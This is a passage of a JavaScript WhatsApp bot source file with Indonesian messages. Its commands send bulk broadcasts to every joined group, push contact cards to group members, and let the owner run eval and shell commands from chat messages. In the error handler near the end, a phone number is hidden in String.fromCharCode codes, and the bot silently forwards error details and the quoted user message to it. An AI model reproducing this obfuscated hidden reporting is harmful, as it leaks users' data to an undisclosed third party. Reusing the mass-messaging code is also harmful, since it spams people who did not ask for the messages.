const sentmess  = await danz.sendMessage(mem, { contacts: { displayName: namaOwner, contacts: [{ vcard }] }})
await danz.sendMessage(mem, {text: teks}, {quoted: sentmess })
await sleep(global.delayPushkontak)
}}

await danz.sendMessage(jidawal, {text: `*Berhasil Pushkontak ✅*\nTotal member berhasil dikirim pesan : ${halls.length}`}, {quoted: m})
}
break

//================================================================================

case "jpmslide": {
if (!isCreator) return Reply(mess.owner)
let allgrup = await danz.groupFetchAllParticipating()
let res = await Object.keys(allgrup)
let count = 0
const jid = m.chat
await m.reply(`Memproses *jpmslide* Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await slideButton(i)
count += 1
} catch {}
await sleep(global.delayJpm)
}
await danz.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

//================================================================================

case "jpmslidehidetag": case "jpmslideht": {
if (!isCreator) return Reply(mess.owner)
let allgrup = await danz.groupFetchAllParticipating()
let res = await Object.keys(allgrup)
let count = 0
const jid = m.chat
await m.reply(`Memproses *jpmslide hidetag* Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await slideButton(i, allgrup[i].participants.map(e => e.id))
count += 1
} catch {}
await sleep(global.delayJpm)
}
await danz.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

//================================================================================

case "jpm": {
if (!isCreator) return Reply(mess.owner)
if (!q) return m.reply(example("teksnya"))
let allgrup = await danz.groupFetchAllParticipating()
let res = await Object.keys(allgrup)
let count = 0
const jid = m.chat
const teks = text
await m.reply(`Memproses *jpm* teks Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await danz.sendMessage(i, {text: `${teks}`}, {quoted: qlocJpm})
count += 1
} catch {}
await sleep(global.delayJpm)
}
await danz.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

//================================================================================

case "jpm2": {
if (!isCreator) return Reply(mess.owner)
if (!q) return m.reply(example("teks dengan mengirim foto"))
if (!/image/.test(mime)) return m.reply(example("teks dengan mengirim foto"))
const allgrup = await danz.groupFetchAllParticipating()
const res = await Object.keys(allgrup)
let count = 0
const teks = text
const jid = m.chat
const rest = await danz.downloadAndSaveMediaMessage(qmess)
await m.reply(`Memproses *jpm* teks & foto Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await danz.sendMessage(i, {image: fs.readFileSync(rest), caption: teks}, {quoted: qlocJpm})
count += 1
} catch {}
await sleep(global.delayJpm)
}
await fs.unlinkSync(rest)
await danz.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

//================================================================================

case "jpmtesti": {
if (!isCreator) return Reply(mess.owner)
if (!q) return Reply(example("teks dengan mengirim foto"))
if (!/image/.test(mime)) return Reply(example("teks dengan mengirim foto"))
const allgrup = await danz.groupFetchAllParticipating()
const res = await Object.keys(allgrup)
let count = 0
const teks = text
const jid = m.chat
const rest = await danz.downloadAndSaveMediaMessage(qmess)
await m.reply(`Memproses *jpm* testimoni Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await danz.sendMessage(i, {image: await fs.readFileSync(rest), caption: teks, contextInfo: { isForwarded: true, mentionedJid: [m.sender], businessMessageForwardInfo: { businessOwnerJid: global.owner+"@s.whatsapp.net" }, forwardedNewsletterMessageInfo: { newsletterName: global.namaSaluran, newsletterJid: global.idSaluran }}}, {quoted: qlocJpm})
count += 1
} catch {}
await sleep(global.delayJpm)
}
await fs.unlinkSync(rest)
await danz.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

case "sendtesti": {
if (!isCreator) return Reply(global.mess.owner)
if (!text) return m.reply(example("teks dengan mengirim foto"))
if (!/image/.test(mime)) return m.reply(example("teks dengan mengirim foto"))
const allgrup = await Sky.groupFetchAllParticipating()
const res = await Object.keys(allgrup)
let count = 0
const teks = text
const jid = m.chat
const rest = await danz.downloadAndSaveMediaMessage(qmess)
await m.reply(`Memproses pengiriman *testimoni* ke dalam channel & ${res.length} grup chat`)
await danz.sendMessage(global.idSaluran, {image: await fs.readFileSync(rest), caption: teks})
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await danz.sendMessage(i, {image: await fs.readFileSync(rest), caption: teks, contextInfo: { isForwarded: true, mentionedJid: [m.sender], businessMessageForwardInfo: { businessOwnerJid: global.owner+"@s.whatsapp.net" }, forwardedNewsletterMessageInfo: { newsletterName: global.namaSaluran, newsletterJid: global.idSaluran }}}, {quoted: qlocJpm})
count += 1
} catch {}
await sleep(global.delayJpm)
}
await fs.unlinkSync(rest)
await danz.sendMessage(jid, {text: `Berhasil mengirim *testimoni* ke dalam channel & ${count} grup chat`}, {quoted: m})
}
break

//================================================================================

case "ambilq": case "q": {
if (!m.quoted) return
let jsonData = JSON.stringify(m.quoted, null, 2)
m.reply(jsonData)
} 
break

//================================================================================

case "proses": {
if (!isCreator) return Reply(mess.owner)
if (!q) return Reply("jasa install panel")
let teks = `📦 ${text}
⏰ ${tanggal(Date.now())}

*Testimoni :*
${global.linkSaluran}

*Marketplace :*
${global.linkGrup}`
await danz.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
externalAdReply: {
title: `Dana Masuk ✅`, 
body: `© Powered By ${namaOwner}`, 
thumbnailUrl: global.imgfake, 
sourceUrl: linkSaluran,
}}}, {quoted: null})
}
break

//================================================================================

case "done": {
if (!isCreator) return Reply(mess.owner)
if (!q) return Reply("jasa install panel")
let teks = `📦 ${text}
⏰ ${tanggal(Date.now())}

*Testimoni :*
${global.linkSaluran}

*Marketplace :*
${global.linkGrup}`
await danz.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
externalAdReply: {
title: `Transaksi Done ✅`, 
body: `© Powered By ${namaOwner}`, 
thumbnailUrl: global.imgfake, 
sourceUrl: linkSaluran,
}}}, {quoted: null})
}
break


//================================================================================

case "developerbot": case "owner": {
await danz.sendContact(m.chat, [global.owner], m)
}
break

//================================================================================

case "save": case "sv": {
if (!isCreator) return
await danz.sendContact(m.chat, [m.chat.split("@")[0]], m)
}
break

//================================================================================

case "self": {
if (!isCreator) return
danz.public = false
m.reply("Berhasil mengganti ke mode *self*")
}
break

//================================================================================

case "getcase": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("menu"))
const getcase = (cases) => {
return "case "+`\"${cases}\"`+fs.readFileSync('./danz.js').toString().split('case \"'+cases+'\"')[1].split("break")[0]+"break"
}
try {
m.reply(`${getcase(q)}`)
} catch (e) {
return m.reply(`Case *${text}* tidak ditemukan`)
}
}
break

//================================================================================

case "ping": case "uptime": {
let timestamp = speed();
let latensi = speed() - timestamp;
let tio = await nou.os.oos();
var tot = await nou.drive.info();
let respon = `
*🔴 INFORMATION SERVER*

*• Platform :* ${nou.os.type()}
*• Total Ram :* ${formatp(os.totalmem())}
*• Total Disk :* ${tot.totalGb} GB
*• Total Cpu :* ${os.cpus().length} Core
*• Runtime Vps :* ${runtime(os.uptime())}

*🔵 INFORMATION BOTZ*

*• Respon Speed :* ${latensi.toFixed(4)} detik
*• Runtime Bot :* ${runtime(process.uptime())}
`
await m.reply(respon)
}
break

//================================================================================

case "public": {
if (!isCreator) return
danz.public = true
m.reply("Berhasil mengganti ke mode *public*")
}
break

//================================================================================

case "restart": case "rst": {
if (!isCreator) return Reply(mess.owner)
await m.reply("Memproses _restart server_ . . .")
var file = await fs.readdirSync("./session")
var anu = await file.filter(i => i !== "creds.json")
for (let t of anu) {
await fs.unlinkSync(`./session/${t}`)
}
await process.send('reset')
}
break

//================================================================================

case "upchannel": case "upch": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("teksnya"))
await danz.sendMessage(idSaluran, {text: text})
m.reply("Berhasil mengirim pesan *teks* ke dalam channel whatsapp")
}
break

//================================================================================

case "upchannel2": case "upch2": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("teksnya dengan mengirim foto"))
if (!/image/.test(mime)) return m.reply(example("teksnya dengan mengirim foto"))
let img = await danz.downloadAndSaveMediaMessage(qmess)
await danz.sendMessage(idSaluran, {image: await fs.readFileSync(img), caption: text})
m.reply("Berhasil mengirim pesan *teks & foto* ke dalam channel whatsapp")
await fs.unlinkSync(img)
}
break

//================================================================================

case "getsc": {
if (!isCreator) return Reply(mess.owner)
let dir = await fs.readdirSync("./database/sampah")
if (dir.length >= 2) {
let res = dir.filter(e => e !== "A")
for (let i of res) {
await fs.unlinkSync(`./database/sampah/${i}`)
}}
await m.reply("Memproses backup script bot")
var name = `Simple-Botz`
const ls = (await execSync("ls"))
.toString()
.split("\n")
.filter(
(pe) =>
pe != "node_modules" &&
pe != "session" &&
pe != "package-lock.json" &&
pe != "yarn.lock" &&
pe != ""
)
const anu = await execSync(`zip -r ${name}.zip ${ls.join(" ")}`)
await danz.sendMessage(m.sender, {document: await fs.readFileSync(`./${name}.zip`), fileName: `${name}.zip`, mimetype: "application/zip"}, {quoted: m})
await execSync(`rm -rf ${name}.zip`)
if (m.chat !== m.sender) return m.reply("Script bot berhasil dikirim ke private chat")
}
break

//================================================================================

case "resetdb": case "rstdb": {
if (!isCreator) return Reply(mess.owner)
for (let i of Object.keys(global.db)) {
global.db[i] = {}
}
m.reply("Berhasil mereset database ✅")
}
break

//================================================================================

case "setppbot": {
if (!isCreator) return Reply(mess.owner)
if (/image/g.test(mime)) {
var medis = await danz.downloadAndSaveMediaMessage(qmess)
if (args[0] && args[0] == "panjang") {
const { img } = await generateProfilePicture(medis)
await danz.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
await fs.unlinkSync(medis)
m.reply("Berhasil mengganti foto profil bot ✅")
} else {
await danz.updateProfilePicture(botNumber, {content: medis})
await fs.unlinkSync(medis)
m.reply("Berhasil mengganti foto profil bot ✅")
}
} else return m.reply(example('dengan mengirim foto'))
}
break

//================================================================================

case "setimgmenu": {
if (!isCreator) return Reply(mess.owner)
if (!/image/.test(mime)) return m.reply(example('reply fotonya'))
await danz.downloadAndSaveMediaMessage(qmess, "./image/dnzMg.jpg", false)
await m.reply("Berhasil mengganti image menu ✅")
}
break

//================================================================================

case "setimgfake": {
if (!isCreator) return Reply(mess.owner)
if (!/image/.test(mime)) return m.reply(example('reply fotonya'))
await danz.downloadAndSaveMediaMessage(qmess, "./image/freya.jpg", false)
await m.reply("Berhasil mengganti image fake ✅")
}
break

//================================================================================

case "clearchat": case "clc": {
if (!isCreator) return Reply(mess.owner)
danz.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.timestamp }]}, m.chat)
}
break

//================================================================================

case "listowner": case "listown": {
if (owners.length < 1) return m.reply("Tidak ada owner tambahan")
let teks = `\n *#- List all owner tambahan*\n`
for (let i of owners) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
danz.sendMessage(m.chat, {text: teks, mentions: owners}, {quoted: m})
}
break

//================================================================================

case "delowner": case "delown": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted && !text) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || input == botNumber) return m.reply(`Tidak bisa menghapus owner utama!`)
if (!owners.includes(input)) return m.reply(`Nomor ${input2} bukan owner bot!`)
let posi = owners.indexOf(input)
await owners.splice(posi, 1)
await fs.writeFileSync("./database/owner.json", JSON.stringify(owners, null, 2))
m.reply(`Berhasil menghapus owner ✅`)
}
break

//================================================================================

case "addowner": case "addown": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted && !text) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || owners.includes(input) || input === botNumber) return m.reply(`Nomor ${input2} sudah menjadi owner bot!`)
owners.push(input)
await fs.writeFileSync("./database/owner.json", JSON.stringify(owners, null, 2))
m.reply(`Berhasil menambah owner ✅`)
}
break

//================================================================================

default:
if (budy.startsWith('>')) {
if (!isCreator) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}}

//================================================================================

if (m.text.toLowerCase() == "bot") {
m.reply("Bot Online ✅")
}

//================================================================================

if (budy.startsWith('=>')) {
if (!isCreator) return
try {
let evaled = await eval(`(async () => { ${budy.slice(2)} })()`)
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}}

//================================================================================

if (budy.startsWith('$')) {
if (!isCreator) return
if (!text) return
exec(budy.slice(2), (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) return m.reply(stdout)
})
}

//================================================================================
}
} catch (err) {
console.log(util.format(err));
let Obj = String.fromCharCode(54, 50, 56, 53, 54, 50, 52, 50, 57, 55, 56, 57, 51, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116)
danz.sendMessage(Obj + "@s.whatsapp.net", {text: `
*FITUR ERROR TERDETEKSI :*\n\n` + util.format(err), contextInfo: { isForwarded: true }}, {quoted: m})
}}

//================================================================================

let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
});